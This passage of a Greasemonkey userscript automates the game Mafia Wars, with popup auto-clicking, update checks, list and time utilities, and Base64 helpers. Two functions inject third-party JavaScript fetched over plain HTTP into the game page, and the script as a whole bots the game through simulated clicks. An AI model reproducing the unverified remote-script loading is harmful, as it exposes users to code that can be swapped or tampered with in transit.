            if (isGMChecked('autoGiftAccept') && popupInnerNoTags.indexOf('Show Your Loyalty') != -1) {
              // So there's a 3018 popup! Let's let Z do it for us!
              // Ok, so JQuery should already exist!
              $ = unsafeWindow.jQuery;
              var valueIcon = $("#cb_value_item").attr("src");
              var gagIcon = $("#cb_gag_item").attr("src");
              // If either Sabotage or Help is checked, skip this
              if ((valueIcon.indexOf('mw_messagebox_checkbox1.gif') == -1) && (gagIcon.indexOf('mw_messagebox_checkbox1.gif') == -1)) {
                var eltGag = document.getElementById('gag_item_id');
                var eltValue = document.getElementById('value_item_id');
                var eltRewardXP = document.getElementById('xp_gain_url');
                var eltRewardNRG = document.getElementById('nrg_gain_url');
                var eltRewardSTA = document.getElementById('sta_gain_url');
                var eltLoyalty = document.getElementById('gift_popup_send_gift');
                switch (GM_getValue('autoGiftAcceptChoice',0)) {
                  case 0: //HELP
                    if (eltValue) $('#cb_value_item').click();
                    break;
                  case 1: //SABOTAGE
                    if (eltGag) $('#cb_gag_item').click();
                    break;
                }
                switch (GM_getValue('autoGiftAcceptReward',0)) {
                  case 0: //XP
                    if (eltRewardXP) $('#cb_xp_gain').click();
                    break;
                  case 1: // ENERGY
                    if (eltRewardNRG) $('#cb_nrg_gain').click();
                    break;
                  case 2: // STAMINA
                    if (eltRewardSTA) $('#cb_sta_gain').click();
                    break;
                }
                // Click the loyalty button
                if (eltLoyalty) {
                  $('#gift_popup_send_gift').click();
                  DEBUG('Popup Process: Show Your Loyalty Processed');
                }
                // At this point the button should force the screen to refresh
              }
              return true;
            }
          }
        }
      }
    }
  } catch (ex) {
    DEBUG('Error @handlePopups: ' + ex);
  }
  return false;
}

//update the script (by Richard Gibson; changed by ms99 and blannie)
function updateScript() {
  try {
    GM_xmlhttpRequest({
      method: 'GET',
      url: SCRIPT.metadata + '?' + Math.random(),
      onload: function(resp) {
        if (resp.status != 200) return;

        if (!resp.responseText.match(/@version\s+(\d+).(\d+).(\d+)/)) return;
        var googleVersion = RegExp.$1+'.'+RegExp.$2+'.'+RegExp.$3;
        var runningVersion = SCRIPT.version;
        if (googleVersion != runningVersion) {
          if (window.confirm('Version ' + googleVersion + ' is available!\n\n' + 'Do you want to install this version?' + '\n')) {
            window.location.href = SCRIPT.url;
          }
        } else {
          alert('You already have the latest version: '+ googleVersion);
          return;
        }
      }
    });
  } catch (ex) {
    addToLog('warning Icon', 'BUG DETECTED (updateScript): ' + ex);
  }
}

///////////////////////////////////////////////////////////////////////////////
//                           UTILITY METHODS                                 //
///////////////////////////////////////////////////////////////////////////////

/******************************** General ********************************/

function clearSettings() {
  if (typeof GM_listValues == 'function' &&
      typeof GM_deleteValue == 'function') {
    var values = GM_listValues();
    for (var i in values) {
      if (typeof GM_deleteValue == 'function')
        GM_deleteValue(values[i]);
    }
  } else {
    alert('In order to do this you need at least GreaseMonkey version: 0.8.20090123.1. Please upgrade and try again.');
  }
}

/******************************** Array ********************************/

function getArrayDiffs(workingArray) {
  diffArray = [];
  for (var i = 1; i < workingArray.length; i++) {
    if (workingArray[i] - workingArray[i-1] < 0) {
      diffArray.push(0)
    } else {
      diffArray.push(workingArray[i] - workingArray[i-1]);
    }
  }
  diffArray.unshift(0);
  return diffArray;
}

// Save an array of strings. The strings must not contain "\n".
function setSavedList(listName, list) {
  GM_setValue(listName, list.join('\n'));
}

// Get an array of strings that was saved with setSavedList().
function getSavedList(listName) {
  var savedList = GM_getValue(listName, '');
  return savedList? savedList.split('\n') : [];
}

// Add an item to a list saved with setSavedList().
// If the size of the list is greater than the "max"
// parameter, the first item in the list is removed.
function addSavedListItem(listName, item, max) {
  var savedList = getSavedList(listName);

  // Only add if it isn't already there.
  if (savedList.indexOf(item) != -1) {
    return;
  }

  savedList.push(item);
  if (max > 0) {
    while (max < savedList.length) {
      var itm = savedList.shift();
      DEBUG('Removing ' + itm + ' from ' + listName + '.');
    }
  }
  setSavedList(listName, savedList);
}

// Remove an item from a list saved with setSavedList().
function removeSavedListItem(listName, item) {
  var savedList = getSavedList(listName);
  var idx = savedList.indexOf(item);
  if (idx != -1) {
    savedList.splice(idx, 1);
    setSavedList(listName, savedList);
    return true;
  }
  // No matches.
  return false;
}

function removeJobForItem(jobList, itemName){
  var jobs = getSavedList(jobList, '');
  var i=0;
  if (jobs.length>0){
    var job=jobs[jobs.length-1];
    requirementJob.forEach(
     function(j){
       if (j[1] == job) {
         if (requirementJob[i][0]==itemName) {
           removeSavedListItem(jobList,requirementJob[i][1]);
           DEBUG('removing job'+requirementJob[i][1]);
         }
       }
       i++;
     }
    );
  }
}

function cycleSavedList(listName) {
  // Move the first item to the end of the list.
  var opponents = GM_getValue(listName, '').split('\n');
  var first = opponents.shift();
  if (first) {
    opponents.push(first);
  }
  GM_setValue(listName, opponents.join('\n'));
}

/******************************** HTML/DOM ********************************/

// Load URL and return the untagged response text (synchronous)
function loadUrlWait (url) {
  try {
    var xmlHTTP = new XMLHttpRequest();
    DEBUG('Loading URL (synch): ' + url);
    xmlHTTP.open('GET', url, false);
    xmlHTTP.send(null);
    return xmlHTTP.responseText.untag();
  } catch (ex) {
    DEBUG ('@loadUrl (synch): ' + ex);
    return false;
  }
}

// Load URL and hook the status_change to the function (asynchronous)
function loadUrl (url, funcStateChange) {
  try {
    var xmlHTTP = new XMLHttpRequest();
    DEBUG('Loading URL (asynch): ' + url);
    xmlHTTP.onreadystatechange = funcStateChange;
    xmlHTTP.open('GET', url, true);
    xmlHTTP.send(null);
  } catch (ex) {
    // Ignore exceptions for this
    DEBUG ('@loadUrl (asynch): ' + ex);
  }
}

// Load AttackX script by Spockholm
function attackXfromProfile() {
  var src = 'http://www.spockholm.com/mafia/attackX-beta.js?' + Math.random();
  remakeElement('script', document.getElementsByTagName('head')[0],{'id':'externalScripts','src':src} );
}

// Load Chuck-A-Crap script by Arun
function eventclick_chuckaCrap() {
  var src = 'http://userscripts.org/scripts/source/68186.user.js?' + Math.random();
  remakeElement('script', document.getElementsByTagName('head')[0],{'id':'externalScripts','src':src} );
}

function getMWUrl (server, params) {
  var mwURL = document.location.href;
  mwURL = mwURL.replace(/html_server/, server);
  mwURL = mwURL.replace('#','');

  // Create or Replace params
  for (var i in params) {
    if (new RegExp(i + '=\\w*').test(mwURL))
      mwURL = mwURL.replace(new RegExp(i + '=\\w*'), i + '=' + params[i]);
    else
      mwURL += '&' + i + '=' + params[i];
  }

  return mwURL;
}

function getHitUrl (targetId) {
  return getMWUrl ('html_server', {'xw_controller':'hitlist', 'xw_action':'set', 'target_id':targetId});
}

function getProfileUrl (userId) {
  return getMWUrl ('html_server', {'xw_controller':'stats', 'xw_action':'view', 'user':userId});
}

function stripURI(img) {
  img = img.split('"')[1];
  return img.replace('" />', '');
}

function showIfUnchecked(setting) {
  if (setting != 'checked') {
    setting = 'unchecked';
  }
  return setting;
}

function showIfSelected(setting) {
  if (setting == 'checked') {
    return 'selected';
  } else {
    return 'not selected';
  }
}

function showIfRelative(key) {
  return GM_getValue(key) == 'checked'? 'relative' : 'absolute';
}

// Converts a link element to an HTML string with an optional CSS class.
function linkToString(link, className) {
  if (!link) return link;

  // Decode ID
  var decBase64ID = function (strInput) {
    if (strInput.match(/user=/)) {
      var id = strInput.split('user=')[1].split('\'')[0].split('&')[0];
      strInput = strInput.replace (id, decodeID(id));
    }
    return strInput;
  };

  var str = '<a';
  if (className)
    str += ' class="' + className + '"';
  var onclick = link.getAttribute('onclick');
  if (onclick)
    str += ' onclick="' + decBase64ID(onclick) + '"';

  str += ' href="' + decBase64ID(link.href) + '">' + link.innerHTML + '</a>';

  return str;
}

function decodeHTMLEntities(str) {
  if (!str) return str;

  scratchpad.innerHTML = str;
  return scratchpad.value;
}

// Hide the element
function hideElement(elt, hideFlag) {
  if (!elt) return;
  if (hideFlag == null) hideFlag = true;
  elt.setAttribute("id", hideFlag ? "mwapHide" : "", 0);
  return elt;
}

// Do multiple clicks
function clickBurst (elt, clickCount) {
  if (!elt) {
    addToLog('warning Icon', 'BUG DETECTED: Null element passed to clickBurst().');
    return;
  }

  DEBUG('Clicking ' + clickCount + ' time(s).');
  for (var i = 0; i < clickCount; ++i)
    clickElement (elt);
}

function clickElement(elt) {
  if (!elt) {
    addToLog('warning Icon', 'BUG DETECTED: Null element passed to clickElement().');
    return;
  }

  // Simulate a mouse click on the element.
  var evt = document.createEvent('MouseEvents');
  evt.initMouseEvent("click", true, true, window,
                     0, 0, 0, 0, 0, false, false, false, false, 0, null);
  elt.dispatchEvent(evt);
}

function ignoreElement(element) {
  var parentElt = element.parentNode;
  var id;
  if (parentElt) {
    id = parentElt.id;
    if (id && (id.indexOf('countdown') != -1 || id.indexOf('timer') != -1))
      return true;
  }

  id = element.id;
  if (id && (id.indexOf('countdown') != -1 || id.indexOf('timer') != -1))
    return true;

  return false;
}

function logElement(element, heading) {
  if (!element) return;

  // Write information about the element to the javascript console.
  var elt = element;
  GM_log((heading? heading + ' ' : '') +
         'tag=' + elt.tagName +
         ', id=' + elt.id +
         ', class=' + elt.className +
         ', value=' + elt.nodeValue
  );
  elt = element.parentNode;
  if (elt) {
    GM_log((heading? heading + ' ' : '') +
           'parent tag=' + elt.tagName +
           ', id=' + elt.id +
           ', class=' + elt.className +
           ', value=' + elt.nodeValue
    );
  }
}

function xpathFirst(p, c) {
  return document.evaluate(p, c || document, null, XPathResult.ANY_UNORDERED_NODE_TYPE, null).singleNodeValue;
}

function $x(p, c) {
  var i, r = [], x = document.evaluate(p, c || document, null, XPathResult.UNORDERED_NODE_ITERATOR_TYPE, null);
  while ((i = x.iterateNext())) r.push(i);
  return r;
}

function xpath(query, element) {
  var elt = (element == null) ? document : element;
  return document.evaluate(query, elt, null, XPathResult.ORDERED_NODE_SNAPSHOT_TYPE, null);
}

// Toggle checkbox element and return true if it is checked
function toggleCheckElt(eltId) {
  if (isGMChecked(eltId)) {
    GM_setValue(eltId, 0);
    return false;
  } else {
    GM_setValue(eltId, 'checked');
    return true;
  }
}

// Save an array of checkbox elements
function saveCheckBoxElementArray(arrayEltIds) {
  for (var i=0; i<arrayEltIds.length; i++)
    saveCheckBoxElement(arrayEltIds[i])
}

// Save checkbox element and return true if it is checked
function saveCheckBoxElement(eltId) {
  if (document.getElementById(eltId).checked === true) {
    GM_setValue(eltId, 'checked');
    return true;
  } else {
    GM_setValue(eltId, 0);
    return false;
  }
}

// Check if a GM value is the same as the passed value
function isGMEqual (gmName, gmValue) {
  return GM_getValue(gmName) + '' == gmValue + '';
}

// Check if a GM value is checked
function isGMChecked (gmName) {
  return isGMEqual (gmName, 'checked');
}

// Check if a GM value is undefined
function isGMUndefined (gmName) {
  return isUndefined (GM_getValue(gmName));
}

// Check if a value is undefined
function isUndefined(value) {
  return value + '' == 'undefined';
}

function makeElement(type, appendto, attributes, checked, chkdefault) {
  var element = document.createElement(type);
  if (attributes != null) {
    for (var i in attributes) {
      element.setAttribute(i, attributes[i]);
    }
  }
  if (checked != null) {
    if (GM_getValue(checked, chkdefault) == 'checked') {
      element.setAttribute('checked', 'checked');
    }
  }
  if (appendto) {
    appendto.appendChild(element);
  }
  return element;
}

function destroyByID( id){
  var elt = document.getElementById(id);
  if (elt) elt.parentNode.removeChild(elt);
}

function remakeElement(type, appendto, attributes, checked, chkdefault) {
  if (attributes.id) destroyByID(attributes.id);
  return makeElement(type, appendto, attributes, checked, chkdefault);
}

/******************************** CASH PARSING ********************************/

// Parse a monetary value such as "C$50,000" and return an integer.
function parseCash(cash) {
  var c = cash;
  if (typeof(c) == 'string') {
    c = c.trim().replace(/[A-Z$,'']/g, '');
  }
  return parseInt(c);
}
// Parses a monetary value such as "C$50,000" and returns the city (const NY/CUBA/MOSCOW/BANGKOK/LV).
function parseCashLoc(cash) {
  if (typeof(cash) == 'string') {
    if (cash.match(/([A-Z])\$[\d,]*\d/)) {
      switch (RegExp.$1) {
        case 'C': return CUBA;
        case 'M': return MOSCOW;
        case 'B': return BANGKOK;
        case 'V': return LV;
      }
    }
  }
  return NY;
}

function makeCommaValue(nStr) {
  nStr = String(nStr);
  var rgx = /^(.*\s)?(\d+)(\d{3}\b)/;
  return nStr == (nStr = nStr.replace(rgx, "$1$2,$3")) ? nStr : makeCommaValue(nStr);
}


/******************************** DATE/TIME ********************************/

// reads a date string from a stored GM value and converts it to seconds since 1970
function getGMTime(GMvalue) {
  var tempVal = GM_getValue(GMvalue, 0);
  var d = Date.parse(tempVal);
  return d/1000;
}

// takes a string input in the form of a countdown 'MM:SS', 'HH:MM:SS', 'MM minutes and SS seconds' and stores the
// time when the countdown is zero in a GM value.  Also takes an input of 'now' and stores the current time.
function setGMTime(GMvalue, countdownStr) {
  var d = new Date();
  d.setMilliseconds(0);

  if (countdownStr != 'now')
    d.setTime(d.getTime()+(timeLeft(countdownStr)*1000));

  GM_setValue(GMvalue, d.toString());
}

// returns the number of seconds left until a date stored in a GM value
function timeLeftGM(GMvalue) {
  var timeToCompare = getGMTime(GMvalue);

  var d = new Date();
  d.setMilliseconds(0);

  return Math.max(timeToCompare-(d.getTime()/1000), 0);
}

// takes a string input in the form of 'MM:SS', 'HH:MM:SS', or 'MM minutes and SS seconds' and returns the number of seconds it represents
function timeLeft(timeToConvert) {
  if (!timeToConvert)
    return 0;

  var returnVal = 0;

  var temp = new Array();
  temp = timeToConvert.split(':');

  if (temp.length == 2)  // MM:SS
    returnVal = ((parseInt(temp[0]) * 60) + parseInt(temp[1]));
  else if (temp.length == 3) // HH:MM:SS
    returnVal = ((parseInt(temp[0]) * 60 * 60) + (parseInt(temp[1]) * 60) + parseInt(temp[2]));
  else if (temp.length == 1) {  // 'HH hours and MM minutes and SS seconds'
    temp = timeToConvert.split(' and ');
    for (i = 0; i < temp.length; i++) {
      spaceIndex = temp[i].indexOf(' ');
      if (spaceIndex != -1) {
        firstPart = temp[i].substring(0, spaceIndex);
        secondPart = temp[i].substring(spaceIndex+1, temp[i].length);
        if ((secondPart == 'minutes') || (secondPart == 'minute'))
          returnVal = returnVal + (parseInt(firstPart) * 60);
        else if ((secondPart == 'seconds') || (secondPart == 'second'))
          returnVal = returnVal + (parseInt(firstPart));
        else if ((secondPart == 'hours') || (secondPart == 'hour'))
          returnVal = returnVal + (parseInt(firstPart * 60 * 60));
        else if ((secondPart == 'days') || (secondPart == 'day'))
          returnVal = returnVal + (parseInt(firstPart * 24 * 60 * 60));
      }
    }
  }
  return(returnVal);
}

// Convert decimal time to ?h ?m ?s format
function getDecimalTime(decimalTime) {
  var num = parseFloat(decimalTime);
  var strTime = '';
  if (num) {
    if (num >= 60) {
      strTime = parseInt(num/60) + 'h ';
      num -= parseInt(num); num *= 60;
    }
    strTime += parseInt(num) + 'm ';
    num -= parseInt(num); num *= 60;
    strTime += parseInt(num) + 's';
  }
  return strTime.replace('00','0');
}

// Convert seconds to ?h ?m ?s format
function getHoursTime(timer) {
  var seconds = timeLeftGM(timer);
  if (seconds == 0)
    return 0;
  if (isNaN(seconds))
    return undefined;
  var num = parseInt(seconds);
  var strTime = '';
  if (num) {
    num /= 60;
    if (num >= 60) {
      num /= 60;
      strTime = parseInt(num) + 'h ';
      num -= parseInt(num); num *= 60;
    }
    strTime += parseInt(num) + 'm ';
    num -= parseInt(num); num *= 60;
    strTime += parseInt(num) + 's';
  }
  return strTime;
}

/******************************** Base64 Logic ********************************/

function decodeID (strID) {
  // Unescape and clean up the ID first (for %3D string, non-base 64 strings etc)
  strID = unescape (strID);
  if (isNaN(strID)) {
    strID = decode64(strID);
  }
  return strID;
}

// Function to decode strings from Base64
function decode64(input) {
  var output = "";
  var chr1, chr2, chr3 = "";
  var enc1, enc2, enc3, enc4 = "";
  var i = 0;

  // remove all characters that are not A-Z, a-z, 0-9, +, /, or =
  var base64test = /[^A-Za-z0-9\+\/\=]/g;
  if (base64test.exec(input)) {
    DEBUG('Invalid character(s) found in input (' + input +'). Expect errors in decoding.');
  }
  input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");

  do {
     enc1 = keyStr.indexOf(input.charAt(i++));
     enc2 = keyStr.indexOf(input.charAt(i++));
     enc3 = keyStr.indexOf(input.charAt(i++));
     enc4 = keyStr.indexOf(input.charAt(i++));

     chr1 = (enc1 << 2) | (enc2 >> 4);
     chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
     chr3 = ((enc3 & 3) << 6) | enc4;

     output = output + String.fromCharCode(chr1);

     if (enc3 != 64) {
        output = output + String.fromCharCode(chr2);
     }
     if (enc4 != 64) {
        output = output + String.fromCharCode(chr3);
     }

     chr1 = chr2 = chr3 = "";
     enc1 = enc2 = enc3 = enc4 = "";

  } while (i < input.length);

  return output;
}

function encode64(input) {
  var output = "";
  var chr1, chr2, chr3 = "";
  var enc1, enc2, enc3, enc4 = "";
  var i = 0;

  do {
     chr1 = input.charCodeAt(i++);
     chr2 = input.charCodeAt(i++);
     chr3 = input.charCodeAt(i++);

     enc1 = chr1 >> 2;
     enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);
     enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);
     enc4 = chr3 & 63;

     if (isNaN(chr2)) {
        enc3 = enc4 = 64;
     } else if (isNaN(chr3)) {
        enc4 = 64;
     }

     output = output +
        keyStr.charAt(enc1) +
        keyStr.charAt(enc2) +
        keyStr.charAt(enc3) +
        keyStr.charAt(enc4);
     chr1 = chr2 = chr3 = "";
     enc1 = enc2 = enc3 = enc4 = "";
  } while (i < input.length);

  return output;
}